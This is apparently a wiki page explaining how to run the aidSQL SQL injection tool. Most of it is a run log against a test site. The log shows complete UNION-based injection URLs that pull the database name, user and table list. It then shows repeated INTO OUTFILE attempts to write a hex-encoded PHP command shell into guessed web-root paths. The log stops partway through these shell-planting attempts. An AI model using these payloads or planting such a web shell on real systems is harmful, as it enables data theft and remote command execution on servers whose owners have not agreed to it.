#summary SQL injection example and shell injection for build 01102011


# Introduction #

This is a small document on howto run aidsql-01102011.tgz for performing a successful audit.

```

stalker@hardcore:~/Projects/aidsql/branches>./aidSQL --url=www.aidsql.com                                                    
 
[aidSQL\core\PluginLoader][II] Site added www.aidsql.com                                                                     
[aidSQL\core\PluginLoader][II] Normalized URL: http://www.aidsql.com/                                                        
[aidSQL\http\Crawler][II] ->                                                                                                 
[aidSQL\http\Crawler][II] Fetching content from http://www.aidsql.com/                                                       
[aidSQL\http\Crawler][II] 200 OK                                                                                             
[aidSQL\http\Crawler][II] Found 1 images                                                                                     
[aidSQL\http\Crawler][II] Add file writable/test.jpg                                                                         
[aidSQL\http\Crawler][II] TOTAL URL's found: 1                                                                               
[aidSQL\http\Crawler][II] Add file test.php ...                                                                              
[aidSQL\http\Crawler][II] Page "test.php" matches required types php,asp,aspx,cfm,do,htm,html                                
[aidSQL\http\Crawler][II] Add URL "http://www.aidsql.com/testing/test.php"!                                                  
[aidSQL][EE] Not enough links to check if the site is vulnerable :/                                                          

```

As we see, here it fails to crawl because this page doesnt has any usefull links as you can see, useful links are pages that have parameters or forms on them. I decided to add the --crawl parameter since there's NO POINT at all in taking 35 minutes to crawl a site that all pages end up being a mod\_rewrite artifact, really no point at all.

Now, lets try adding the --crawl parameter with a depth of 3 I'll also add other parameters since I know what Im doing

```
stalker@hardcore:~/Projects/aidsql/branches>time ./aidSQL --url=www.aidsql.com --crawl=3 \
--sqli-mysql5-numeric-only=1 \
--colors=0 \ 
--sqli-mysql5-field-payloads="'"
```


**Note 1:** The --sqli-mysql5-numeric-only parameter will cause the plugin **only** to audit numeric URL variables.
This option was added because of a simple fact: most programmers think that escaping strings or taking away single quotes via a replace (regex or str) its the final and end of all solutions to SQL injection, in fact, if you ask anyone about sqli,the first thing they'll come up with is with single quotes). aidSQL does injection not needing to use single quotes. In this scenario I needed to use a single quote as a field payload because I've enclosed integers with quotes in the code.

**Note 2:** All of the specified plugin and main options can be configured as a default through the corresponding configuration files.

```
                           
[aidSQL\core\PluginLoader][II] Site added www.aidsql.com                                                                     
[aidSQL\core\PluginLoader][II] Normalized URL: http://www.aidsql.com/                                                        
[aidSQL\http\Crawler][II] ->                                                                                                 
[aidSQL\http\Crawler][II] Fetching content from http://www.aidsql.com/                                                       
[aidSQL\http\Crawler][II] 200 OK                                                                                             
[aidSQL\http\Crawler][II] Found 1 images                                                                                     
[aidSQL\http\Crawler][II] Add file writable/test.jpg
[aidSQL\http\Crawler][II] TOTAL URL's found: 1                            
[aidSQL\http\Crawler][II] Add file test.php ...                                                                              
[aidSQL\http\Crawler][II] Page "test.php" matches required types php,asp,aspx,cfm,do,htm,html                                
[aidSQL\http\Crawler][II] Add URL "http://www.aidsql.com/testing/test.php"!                                                  
[aidSQL\http\Crawler][II] ->                                                                                                 
[aidSQL\http\Crawler][II] Fetching content from http://www.aidsql.com/testing/test.php                                       
[aidSQL\http\Crawler][II] 200 OK                                                                                             
[aidSQL\http\Crawler][WW] No images found                                                                                    
[aidSQL\http\Crawler][II] TOTAL URL's found: 1                                                                               
[aidSQL\http\Crawler][II] Add file testindex.php ...                                                                         
[aidSQL\http\Crawler][II] Page "testindex.php" matches required types php,asp,aspx,cfm,do,htm,html                           
[aidSQL\http\Crawler][II] Add URL "http://www.aidsql.com/testing/testindex.php"!                                             
[aidSQL\http\Crawler][II] -->                                                                                                
[aidSQL\http\Crawler][II] Fetching content from http://www.aidsql.com/testing/testindex.php                                  
[aidSQL\http\Crawler][II] 200 OK                                                                                             
[aidSQL\http\Crawler][WW] No images found                                                                                    
[aidSQL\http\Crawler][II] TOTAL URL's found: 1                                                                               
[aidSQL\http\Crawler][II] Add file index.php ...                                                                             
[aidSQL\http\Crawler][II] Page "index.php" matches required types php,asp,aspx,cfm,do,htm,html                               
[aidSQL\http\Crawler][II] Add URL "http://www.aidsql.com/index.php?id=1"!                                                    
[aidSQL\http\Crawler][II] --->                                                                                               
[aidSQL\http\Crawler][EE] DEPTH LIMIT REACHED!                                                                               
[aidSQL\http\Crawler][EE] DEPTH LIMIT REACHED!                                                                               
[aidSQL\http\Crawler][EE] DEPTH LIMIT REACHED!                                                                               
[aidSQL\http\Crawler][II] 1. {http://www.aidsql.com/index.php?id=1}             {GET}                                        
[aidSQL\http\Crawler][II] 2. {http://www.aidsql.com/index.php?id=1}             {GET}                                        
[aidSQL\core\PluginLoader][II] Load sqli => mysql5 ... OK                                                                    
[aidSQL\core\Runner][II] Testing aidSQL\plugin\sqli\MySQL5 sql injection plugin...                                           
[aidSQL\plugin\sqli\MySQL5][II] [id] Attempt:   1                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Comment Payload:        /*                                                                   
[aidSQL\plugin\sqli\MySQL5][II] Ending Payload: LIMIT 1,1                                                                    
[aidSQL\plugin\sqli\MySQL5][II] Field Payload:  '                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C1%2C0x6937326463%29+LIMIT+1%2C1+%2F%2A                                                                                          
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] HTTP 200                                                                                     
[aidSQL\plugin\sqli\MySQL5][II] Ending Payload: ORDER BY 1                                                                   
[aidSQL\plugin\sqli\MySQL5][II] Field Payload:  '                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C1%2C0x6937326463%29+ORDER+BY+1+%2F%2A                                                                                           
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] HTTP 200                                                                                     
[aidSQL\plugin\sqli\MySQL5][II] Ending Payload: LIMIT 1,1 ORDER BY 1                                                         
[aidSQL\plugin\sqli\MySQL5][II] Field Payload:  '                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C1%2C0x6937326463%29+LIMIT+1%2C1+ORDER+BY+1+%2F%2A                                                                               
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] HTTP 200                                                                                     
[aidSQL\plugin\sqli\MySQL5][II] Comment Payload:        --                                                                   
[aidSQL\plugin\sqli\MySQL5][II] Ending Payload: LIMIT 1,1                                                                    
[aidSQL\plugin\sqli\MySQL5][II] Field Payload:  '                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C1%2C0x6937326463%29+LIMIT+1%2C1+--                                                                                              
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] HTTP 200                                                                                     
[aidSQL\plugin\sqli\MySQL5][II] Ending Payload: ORDER BY 1                                                                   
[aidSQL\plugin\sqli\MySQL5][II] Field Payload:  '                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C1%2C0x6937326463%29+ORDER+BY+1+--                                                                                               
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] HTTP 200                                                                                     
[aidSQL\plugin\sqli\MySQL5][II] Ending Payload: LIMIT 1,1 ORDER BY 1                                                         
[aidSQL\plugin\sqli\MySQL5][II] Field Payload:  '                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C1%2C0x6937326463%29+LIMIT+1%2C1+ORDER+BY+1+--                                                                                   
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] HTTP 200                                                                                     
[aidSQL\plugin\sqli\MySQL5][II] Comment Payload:        #                                                                    
[aidSQL\plugin\sqli\MySQL5][II] Ending Payload: LIMIT 1,1                                                                    
[aidSQL\plugin\sqli\MySQL5][II] Field Payload:  '                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C1%2C0x6937326463%29+LIMIT+1%2C1+%23                                                                                             
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] HTTP 200                                                                                     
[aidSQL\plugin\sqli\MySQL5][II] Ending Payload: ORDER BY 1                                                                   
[aidSQL\plugin\sqli\MySQL5][II] Field Payload:  '                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C1%2C0x6937326463%29+ORDER+BY+1+%23                                                                                              
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] HTTP 200                                                                                     
[aidSQL\plugin\sqli\MySQL5][II] Ending Payload: LIMIT 1,1 ORDER BY 1                                                         
[aidSQL\plugin\sqli\MySQL5][II] Field Payload:  '                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C1%2C0x6937326463%29+LIMIT+1%2C1+ORDER+BY+1+%23                                                                                  
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] HTTP 200                                                                                     
[aidSQL\plugin\sqli\MySQL5][II] [id] Attempt:   2                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Comment Payload:        /*                                                                   
[aidSQL\plugin\sqli\MySQL5][II] Ending Payload: LIMIT 1,1                                                                    
[aidSQL\plugin\sqli\MySQL5][II] Field Payload:  '                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C1%2C0x6937326463%29%2CCONCAT%280x6965616134%2C2%2C0x6937326463%29+LIMIT+1%2C1+%2F%2A                                            
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] HTTP 200                                                                                     
[aidSQL\plugin\sqli\MySQL5][II] Ending Payload: ORDER BY 1                                                                   
[aidSQL\plugin\sqli\MySQL5][II] Field Payload:  '                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C1%2C0x6937326463%29%2CCONCAT%280x6965616134%2C2%2C0x6937326463%29+ORDER+BY+1+%2F%2A                                             
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] HTTP 200                                                                                     
[aidSQL\plugin\sqli\MySQL5][II] Ending Payload: LIMIT 1,1 ORDER BY 1                                                         
[aidSQL\plugin\sqli\MySQL5][II] Field Payload:  '                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C1%2C0x6937326463%29%2CCONCAT%280x6965616134%2C2%2C0x6937326463%29+LIMIT+1%2C1+ORDER+BY+1+%2F%2A                                 
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] HTTP 200                                                                                     
[aidSQL\plugin\sqli\MySQL5][II] Comment Payload:        --                                                                   
[aidSQL\plugin\sqli\MySQL5][II] Ending Payload: LIMIT 1,1                                                                    
[aidSQL\plugin\sqli\MySQL5][II] Field Payload:  '                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C1%2C0x6937326463%29%2CCONCAT%280x6965616134%2C2%2C0x6937326463%29+LIMIT+1%2C1+--                                                
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] HTTP 200                                                                                     
[aidSQL\plugin\sqli\MySQL5][II] Ending Payload: ORDER BY 1                                                                   
[aidSQL\plugin\sqli\MySQL5][II] Field Payload:  '                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C1%2C0x6937326463%29%2CCONCAT%280x6965616134%2C2%2C0x6937326463%29+ORDER+BY+1+--                                                 
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] HTTP 200                                                                                     
[aidSQL\plugin\sqli\MySQL5][II] Ending Payload: LIMIT 1,1 ORDER BY 1                                                         
[aidSQL\plugin\sqli\MySQL5][II] Field Payload:  '                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C1%2C0x6937326463%29%2CCONCAT%280x6965616134%2C2%2C0x6937326463%29+LIMIT+1%2C1+ORDER+BY+1+--                                     
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] HTTP 200                                                                                     
[aidSQL\plugin\sqli\MySQL5][II] Comment Payload:        #                                                                    
[aidSQL\plugin\sqli\MySQL5][II] Ending Payload: LIMIT 1,1                                                                    
[aidSQL\plugin\sqli\MySQL5][II] Field Payload:  '                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C1%2C0x6937326463%29%2CCONCAT%280x6965616134%2C2%2C0x6937326463%29+LIMIT+1%2C1+%23                                               
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] HTTP 200                                                                                     
[aidSQL\plugin\sqli\MySQL5][II] http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C1%2C0x6937326463%29%2CCONCAT%280x6965616134%2C2%2C0x6937326463%29+LIMIT+1%2C1+%23                                                        
[aidSQL\plugin\sqli\MySQL5][II] FOUND SQL INJECTION!!!                                                                       
[aidSQL\plugin\sqli\MySQL5][II] Affected Variable:      id                                                                   
[aidSQL\plugin\sqli\MySQL5][II] Affected Fields:        1,1,2,2                                                              
[aidSQL\plugin\sqli\MySQL5][II] Field Count:    2                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Picking field "1" to perform further analysis ...                                            
[aidSQL\plugin\sqli\MySQL5][II] Site is vulnerable to sql injection!!                                                        
[aidSQL\plugin\sqli\MySQL5][II] Doing DATABASE() Injection                                                                   
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CDATABASE%28%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23                                                                            
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Doing USER() Injection                                                                       
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CUSER%28%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23                                                                                
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Doing GROUP_CONCAT(TABLE_NAME) Injection                                                     
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CGROUP_CONCAT%28TABLE_NAME%29%2C0x6937326463%29%2C2+FROM+information_schema.tables+WHERE+table_schema%3DDATABASE%28%29+LIMIT+1%2C1+%23                                                                                                                        
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\core\Runner][II] BASIC INFORMATION                                                                                   
[aidSQL\core\Runner][II] ---------------------------------                                                                   
[aidSQL\core\Runner][II] PLUGIN         :       MySQL5 Standard Plugin by Juan Stange                                        
[aidSQL\core\Runner][II] DBASE          :       test                                                                         
[aidSQL\core\Runner][II] USER           :       root@localhost                                                               
[aidSQL\core\Runner][II] TABLES         :       news                                                                         
[aidSQL\core\Runner][II] IS ROOT        :       YES                                                                          
[aidSQL\core\Runner][EE] Trying to get Shell ...                                                                             
[aidSQL\core\PluginLoader][II] Load info => defaults ... OK                                                                  
[aidSQL\plugin\info\InfoPlugin][II] Trying to discover default directory locations ...                                       
[aidSQL\plugin\info\InfoPlugin][II] http://www.aidsql.com/templates_c ...                                                    
[aidSQL\plugin\info\InfoPlugin][II] http://www.aidsql.com/img ...                                                            
[aidSQL\plugin\info\InfoPlugin][II] http://www.aidsql.com/image ...                                                          
[aidSQL\plugin\info\InfoPlugin][II] http://www.aidsql.com/images ...                                                         
[aidSQL\plugin\info\InfoPlugin][II] http://www.aidsql.com/tmp ...                                                            
[aidSQL\plugin\info\InfoPlugin][II] http://www.aidsql.com/temp ...                                                           
[aidSQL\plugin\info\InfoPlugin][II] http://www.aidsql.com/test ...                                                           
[aidSQL\plugin\info\InfoPlugin][WW] No possible default writable web path was found :(                                       
[aidSQL\plugin\sqli\MySQL5][II] Adding crawler path information: writable                                                    
[aidSQL\plugin\sqli\MySQL5][II] Adding crawler path information: testing                                                     
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/var/www//eda.php"                                                
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fvar%2Fwww%2F%2Feda.php%27+%23                                                                                                                        
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7661722f7777772f2f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23                                       
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/var/www/www.aidsql.com//eda.php"                                 
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fvar%2Fwww%2Fwww.aidsql.com%2F%2Feda.php%27+%23                                                                                                       
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7661722f7777772f7777772e61696473716c2e636f6d2f2f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23         
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/var/www/aidsql.com//eda.php"                                     
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fvar%2Fwww%2Faidsql.com%2F%2Feda.php%27+%23                                                                                                           
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7661722f7777772f61696473716c2e636f6d2f2f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23                 
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/usr/local/www//eda.php"                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fusr%2Flocal%2Fwww%2F%2Feda.php%27+%23                                                                                                                
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7573722f6c6f63616c2f7777772f2f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23                           
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/usr/local/www/www.aidsql.com//eda.php"                           
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fusr%2Flocal%2Fwww%2Fwww.aidsql.com%2F%2Feda.php%27+%23                                                                                               
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7573722f6c6f63616c2f7777772f7777772e61696473716c2e636f6d2f2f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23                                                                                                                          
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/usr/local/www/aidsql.com//eda.php"                               
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fusr%2Flocal%2Fwww%2Faidsql.com%2F%2Feda.php%27+%23                                                                                                   
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7573722f6c6f63616c2f7777772f61696473716c2e636f6d2f2f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23     
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/www//eda.php"                                                    
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fwww%2F%2Feda.php%27+%23 
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7777772f2f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23                                               
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/www/www.aidsql.com//eda.php"                                     
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fwww%2Fwww.aidsql.com%2F%2Feda.php%27+%23                                                                                                             
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7777772f7777772e61696473716c2e636f6d2f2f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23                 
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/www/aidsql.com//eda.php"                                         
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fwww%2Faidsql.com%2F%2Feda.php%27+%23                                                                                                                 
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7777772f61696473716c2e636f6d2f2f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23                         
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/var/www/testing/eda.php"                                         
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fvar%2Fwww%2Ftesting%2Feda.php%27+%23                                                                                                                 
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7661722f7777772f74657374696e672f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23                         
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/var/www/www.aidsql.com/testing/eda.php"                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fvar%2Fwww%2Fwww.aidsql.com%2Ftesting%2Feda.php%27+%23                                                                                                
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7661722f7777772f7777772e61696473716c2e636f6d2f74657374696e672f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23                                                                                                                        
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/var/www/aidsql.com/testing/eda.php"                              
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fvar%2Fwww%2Faidsql.com%2Ftesting%2Feda.php%27+%23                                                                                                    
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7661722f7777772f61696473716c2e636f6d2f74657374696e672f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23   
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/usr/local/www/testing/eda.php"                                   
